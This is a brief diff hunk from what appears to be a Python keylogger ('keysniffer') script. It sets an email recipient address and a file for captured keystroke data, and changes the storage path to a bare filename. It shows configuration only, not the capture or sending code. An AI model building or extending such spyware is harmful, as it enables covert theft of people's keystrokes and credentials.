@@ -23,7 +23,7 @@ username = getpass.getuser()
 
 toaddr = "7unkym0nk3y@gmail.com"
 keys_information = "keysniffer_data.txt"
-file_path = "C:\\Users\\Cyb3r_Tyr\\Documents"
+file_path = "keysniffer_data.txt"
 extend = "\\"
 file_merge = file_path + extend
 
